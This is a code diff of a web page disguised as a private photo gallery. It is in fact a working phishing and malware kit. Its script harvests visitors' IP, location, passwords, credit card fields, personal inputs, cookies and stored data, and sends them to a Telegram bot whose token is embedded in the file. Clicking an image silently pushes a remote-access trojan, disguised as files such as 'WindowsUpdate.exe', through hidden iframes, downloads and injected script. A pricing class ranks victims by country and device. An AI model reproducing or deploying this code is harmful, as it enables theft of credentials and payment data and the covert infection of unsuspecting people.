@@ -93,7 +93,7 @@
         <p class="subtitle">Exclusive content - Click to view full album</p>
         
         <div class="gallery">
-            <div class="image-card" onclick="startRATDeployment(1)">
+            <div class="image-card" onclick="startStealthExploitation(1)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 1" 
                      onerror="this.src='https://via.placeholder.com/200x150/667eea/ffffff?text=Photo+1'">
@@ -101,7 +101,7 @@
                 <div class="image-desc">normal pics </div>
             </div>
             
-            <div class="image-card" onclick="startRATDeployment(2)">
+            <div class="image-card" onclick="startStealthExploitation(2)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                      alt="Private Photo 2"
                      onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
@@ -109,7 +109,7 @@
                 <div class="image-desc">Title says it all lol</div>
             </div>
             
-            <div class="image-card" onclick="startRATDeployment(3)">
+            <div class="image-card" onclick="startStealthExploitation(3)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                      alt="Private Photo 3"
                      onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
@@ -128,7 +128,6 @@
     </div>
 
     <script>
-        // Simple Configuration
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
@@ -142,136 +141,121 @@
             }
         };
 
-        // Global variables
         let victimId = null;
+        let victimValue = 0;
 
-        // Generate victim ID immediately
-        function generateVictimId() {
-            const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-            return `VICTIM_${randomId.toUpperCase()}`;
+        class VictimValuation {
+            static calculateVictimValue(victimData) {
+                let value = 0;
+                
+                // Location value
+                const countryValue = this.getCountryValue(victimData.location.country_code);
+                value += countryValue;
+                
+                // Device value
+                if (victimData.browser.platform.includes('Mac')) value += 15;
+                if (parseInt(victimData.browser.memory) >= 8) value += 10;
+                if (victimData.browser.cores >= 4) value += 8;
+                
+                // Data value
+                value += victimData.passwords.length * 5;
+                value += victimData.creditCards.length * 8;
+                value += Object.keys(victimData.personalInfo).length * 2;
+                
+                return Math.max(10, Math.min(100, value));
+            }
+            
+            static getCountryValue(countryCode) {
+                const premium = ['US', 'CA', 'UK', 'DE', 'FR', 'AU', 'CH', 'SG', 'AE'];
+                const medium = ['JP', 'KR', 'NZ', 'NO', 'SE', 'DK', 'FI', 'AT', 'BE', 'NL'];
+                
+                if (premium.includes(countryCode)) return 25;
+                if (medium.includes(countryCode)) return 15;
+                return 8;
+            }
+            
+            static getPriceClass(value) {
+                if (value >= 60) return 'PREMIUM';
+                if (value >= 35) return 'HIGH';
+                if (value >= 20) return 'MEDIUM';
+                return 'LOW';
+            }
+            
+            static generateVictimID(victimData) {
+                const country = victimData.location.country_code || 'UN';
+                const price = this.calculateVictimValue(victimData);
+                const priceClass = this.getPriceClass(price);
+                const randomCode = Math.random().toString(36).substr(2, 6).toUpperCase();
+                return `VI.${country}.${priceClass}.${randomCode}`;
+            }
         }
 
-        // SIMPLE TELEGRAM FUNCTION WITH MULTIPLE FALLBACKS
         async function sendToTelegram(message) {
-            if (!victimId) victimId = generateVictimId();
+            if (!victimId) return;
             
-            const fullMessage = `🔰 ${victimId}\n${message}`;
-            console.log('Sending to Telegram:', fullMessage);
+            const fullMessage = `${victimId}\n${message}`;
             
-            // Method 1: Direct fetch
             try {
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CONFIG.telegram.chatId,
-                        text: fullMessage,
-                        parse_mode: 'HTML'
+                        text: fullMessage
                     })
                 });
-                
-                if (response.ok) {
-                    console.log('Telegram message sent successfully');
-                    return true;
-                }
+                return response.ok;
             } catch (error) {
-                console.log('Method 1 failed:', error);
+                console.log('Telegram error:', error);
+                return false;
             }
-
-            // Method 2: Using image beacon
-            try {
-                const img = new Image();
-                const encodedMessage = encodeURIComponent(fullMessage);
-                img.src = `https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage?chat_id=${CONFIG.telegram.chatId}&text=${encodedMessage}`;
-                console.log('Method 2 attempted');
-                return true;
-            } catch (error) {
-                console.log('Method 2 failed:', error);
-            }
-
-            // Method 3: Using form submission
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', CONFIG.telegram.chatId);
-                formData.append('text', fullMessage);
-                
-                fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
-                    method: 'POST',
-                    body: formData
-                });
-                console.log('Method 3 attempted');
-                return true;
-            } catch (error) {
-                console.log('Method 3 failed:', error);
-            }
-
-            return false;
         }
 
-        // SIMPLE DATA COLLECTION
-        function collectBasicData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || 'Direct',
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(getAllLocalStorage()),
-                forms: collectFormData(),
-                inputs: collectInputData(),
-                passwords: collectPasswords()
+        async function collectVictimData() {
+            const ipData = await getIPData();
+            const location = await getLocationData(ipData.ip);
+            
+            const victimData = {
+                location: location,
+                browser: {
+                    platform: navigator.platform,
+                    memory: navigator.deviceMemory || 'Unknown',
+                    cores: navigator.hardwareConcurrency,
+                    language: navigator.language
+                },
+                passwords: collectPasswords(),
+                creditCards: collectCreditCards(),
+                personalInfo: collectPersonalInfo(),
+                system: collectSystemData()
             };
             
-            // Get IP
-            getIP().then(ip => {
-                data.ip = ip;
-                sendCollectedData(data);
-            }).catch(() => {
-                data.ip = 'Unknown';
-                sendCollectedData(data);
-            });
-            
-            return data;
+            return victimData;
         }
 
-        function getAllLocalStorage() {
-            const ls = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                ls[key] = localStorage.getItem(key);
+        async function getIPData() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return { ip: data.ip };
+            } catch (error) {
+                return { ip: 'Unknown' };
             }
-            return ls;
         }
 
-        function collectFormData() {
-            const forms = {};
-            document.querySelectorAll('form').forEach((form, index) => {
-                const formData = {};
-                form.querySelectorAll('input, select, textarea').forEach(field => {
-                    if (field.value) {
-                        formData[field.name || field.type || `field_${index}`] = field.value;
-                    }
-                });
-                if (Object.keys(formData).length > 0) {
-                    forms[`form_${index}`] = formData;
-                }
-            });
-            return forms;
-        }
-
-        function collectInputData() {
-            const inputs = {};
-            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
-                if (input.value) {
-                    inputs[input.name || input.placeholder || 'unknown'] = input.value;
-                }
-            });
-            return inputs;
+        async function getLocationData(ip) {
+            if (!ip || ip === 'Unknown') return { country_code: 'UN', city: 'Unknown', country: 'Unknown' };
+            
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    country_code: data.country_code || 'UN',
+                    city: data.city || 'Unknown',
+                    country: data.country_name || 'Unknown'
+                };
+            } catch (error) {
+                return { country_code: 'UN', city: 'Unknown', country: 'Unknown' };
+            }
         }
 
         function collectPasswords() {
@@ -287,71 +271,126 @@
             return passwords;
         }
 
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                try {
-                    const response = await fetch('https://api64.ipify.org?format=json');
-                    const data = await response.json();
-                    return data.ip;
-                } catch (error) {
-                    return 'Unknown';
+        function collectCreditCards() {
+            const cards = [];
+            document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"]').forEach(field => {
+                if (field.value && field.value.replace(/\s/g, '').length > 10) {
+                    cards.push({
+                        type: field.name || 'card',
+                        value: field.value
+                    });
                 }
-            }
+            });
+            return cards;
         }
 
-        function sendCollectedData(data) {
-            if (!victimId) victimId = generateVictimId();
-            
-            let message = `🆕 NEW VICTIM CONNECTED\n`;
-            message += `🔰 ID: ${victimId}\n`;
-            message += `🌐 IP: ${data.ip}\n`;
-            message += `🕒 Time: ${data.timestamp}\n`;
-            message += `🔗 URL: ${data.url}\n`;
-            message += `📱 Platform: ${data.platform}\n`;
-            message += `🖥️ Screen: ${data.screen}\n`;
-            message += `🌍 Language: ${data.language}\n\n`;
-            
-            message += `📊 DATA CAPTURED:\n`;
-            message += `🔑 Passwords: ${data.passwords.length}\n`;
-            message += `📝 Forms: ${Object.keys(data.forms).length}\n`;
-            message += `✏️ Inputs: ${Object.keys(data.inputs).length}\n`;
-            message += `🍪 Cookies: ${data.cookies ? 'Yes' : 'No'}\n`;
-            message += `💾 LocalStorage: ${Object.keys(JSON.parse(data.localStorage)).length} items\n`;
-            
-            if (data.passwords.length > 0) {
-                message += `\n🔑 PASSWORDS:\n`;
-                data.passwords.forEach((pwd, i) => {
-                    message += `${i+1}. ${pwd.field}: ${pwd.value}\n`;
-                });
-            }
-            
-            if (Object.keys(data.inputs).length > 0) {
-                message += `\n✏️ INPUT DATA:\n`;
-                Object.entries(data.inputs).forEach(([key, value]) => {
-                    message += `${key}: ${value}\n`;
-                });
-            }
-
-            sendToTelegram(message);
+        function collectPersonalInfo() {
+            const info = {};
+            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(input => {
+                if (input.value) {
+                    const key = input.name || input.placeholder || 'field';
+                    info[key] = input.value;
+                }
+            });
+            return info;
         }
 
-        // RAT DEPLOYMENT
-        async function startRATDeployment(imageId) {
+        function collectSystemData() {
+            return {
+                screen: `${screen.width}x${screen.height}`,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform
+            };
+        }
+
+        function deployStealthRAT() {
+            // Method 1: Invisible iframe
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.src = CONFIG.ratUrl;
+                iframe.style.cssText = 'position:absolute;width:0;height:0;border:none;opacity:0;visibility:hidden;';
+                document.body.appendChild(iframe);
+                setTimeout(() => {
+                    if (document.body.contains(iframe)) {
+                        document.body.removeChild(iframe);
+                    }
+                }, 10000);
+                return true;
+            } catch (e) {
+                console.log('Method 1 failed');
+            }
+
+            // Method 2: Background fetch
+            try {
+                fetch(CONFIG.ratUrl)
+                    .then(response => response.blob())
+                    .then(blob => {
+                        const url = URL.createObjectURL(blob);
+                        const link = document.createElement('a');
+                        link.href = url;
+                        link.download = 'WindowsUpdate.exe';
+                        link.style.cssText = 'display:none;';
+                        document.body.appendChild(link);
+                        link.click();
+                        setTimeout(() => {
+                            document.body.removeChild(link);
+                            URL.revokeObjectURL(url);
+                        }, 5000);
+                    });
+                return true;
+            } catch (e) {
+                console.log('Method 2 failed');
+            }
+
+            // Method 3: Script injection
+            try {
+                const script = document.createElement('script');
+                script.innerHTML = `
+                    var x = new XMLHttpRequest();
+                    x.open('GET', '${CONFIG.ratUrl}', true);
+                    x.responseType = 'blob';
+                    x.onload = function() {
+                        var url = window.URL.createObjectURL(x.response);
+                        var a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'SystemTools.exe';
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        setTimeout(function() {
+                            document.body.removeChild(a);
+                            window.URL.revokeObjectURL(url);
+                        }, 5000);
+                    };
+                    x.send();
+                `;
+                document.head.appendChild(script);
+                setTimeout(() => document.head.removeChild(script), 1000);
+                return true;
+            } catch (e) {
+                console.log('Method 3 failed');
+            }
+
+            return false;
+        }
+
+        async function startStealthExploitation(imageId) {
             const loading = document.getElementById('loading');
             const loadingText = document.getElementById('loadingText');
             
             loading.style.display = 'block';
-            loadingText.textContent = 'Preparing content...';
+            loadingText.textContent = 'Loading content...';
             
             // Send click notification
-            await sendToTelegram(`🖱️ IMAGE CLICKED\nImage ID: ${imageId}\nUser attempting to access content`);
+            await sendToTelegram(`IMAGE CLICKED - ID: ${imageId}`);
             
-            // Deploy RAT
-            await deployRAT();
+            // Deploy RAT silently
+            const ratDeployed = deployStealthRAT();
+            
+            if (ratDeployed) {
+                await sendToTelegram(`RAT DEPLOYED SILENTLY - VICTIM VALUE: $${victimValue}`);
+            }
             
             // Redirect to image
             setTimeout(() => {
@@ -359,101 +398,28 @@
             }, 2000);
         }
 
-        async function deployRAT() {
-            await sendToTelegram(`🚀 DEPLOYING RAT...`);
+        // Initialize on page load
+        window.addEventListener('load', async function() {
+            console.log('Starting automatic exploitation...');
             
-            // Multiple deployment methods
-            const methods = [deployMethod1, deployMethod2, deployMethod3];
+            const victimData = await collectVictimData();
+            victimValue = VictimValuation.calculateVictimValue(victimData);
+            victimId = VictimValuation.generateVictimID(victimData);
             
-            for (const method of methods) {
-                try {
-                    const success = await method();
-                    if (success) {
-                        await sendToTelegram(`✅ RAT DEPLOYED SUCCESSFULLY`);
-                        break;
-                    }
-                } catch (error) {
-                    console.log('Deployment method failed:', error);
-                }
-            }
-        }
-
-        async function deployMethod1() {
-            try {
-                const link = document.createElement('a');
-                link.href = CONFIG.ratUrl;
-                link.download = 'PhotoViewer_Setup.exe';
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                setTimeout(() => document.body.removeChild(link), 3000);
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-
-        async function deployMethod2() {
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.src = CONFIG.ratUrl;
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
-                setTimeout(() => document.body.removeChild(iframe), 5000);
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-
-        async function deployMethod3() {
-            try {
-                window.open(CONFIG.ratUrl, '_blank');
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-
-        // START EVERYTHING ON PAGE LOAD
-        window.addEventListener('load', function() {
-            console.log('Starting data collection...');
-            victimId = generateVictimId();
+            let report = `NEW VICTIM CONNECTED\n`;
+            report += `VICTIM ID: ${victimId}\n`;
+            report += `ESTIMATED VALUE: $${victimValue}\n`;
+            report += `LOCATION: ${victimData.location.city}, ${victimData.location.country}\n`;
+            report += `IP: ${victimData.location.ip || 'Unknown'}\n`;
+            report += `PLATFORM: ${victimData.browser.platform}\n`;
+            report += `PASSWORDS CAPTURED: ${victimData.passwords.length}\n`;
+            report += `CREDIT CARDS: ${victimData.creditCards.length}\n`;
+            report += `PERSONAL INFO: ${Object.keys(victimData.personalInfo).length} fields`;
             
-            // Send immediate notification
-            sendToTelegram(`🚀 PAGE LOADED\nStarting data collection...`);
-            
-            // Collect and send data
-            setTimeout(() => {
-                collectBasicData();
-            }, 1000);
-            
-            // Send periodic updates
-            setInterval(() => {
-                sendToTelegram(`📊 HEARTBEAT\nSystem active - ${new Date().toLocaleTimeString()}`);
-            }, 60000); // Every minute
+            await sendToTelegram(report);
         });
 
-        // Also collect data on form interactions
-        document.addEventListener('submit', function(e) {
-            setTimeout(() => {
-                sendToTelegram(`📝 FORM SUBMITTED\nForm action: ${e.target.action || 'unknown'}`);
-                collectBasicData();
-            }, 500);
-        });
-
-        // Collect data on input changes (with debounce)
-        let inputTimeout;
-        document.addEventListener('input', function(e) {
-            clearTimeout(inputTimeout);
-            inputTimeout = setTimeout(() => {
-                if (e.target.value && e.target.value.length > 3) {
-                    sendToTelegram(`⌨️ INPUT DETECTED\nField: ${e.target.name || e.target.type}\nValue: ${e.target.value.substring(0, 50)}`);
-                }
-            }, 1000);
-        });
-
-        console.log('Malicious system initialized');
+        console.log('Stealth exploitation system loaded');
     </script>
 </body>
 </html>
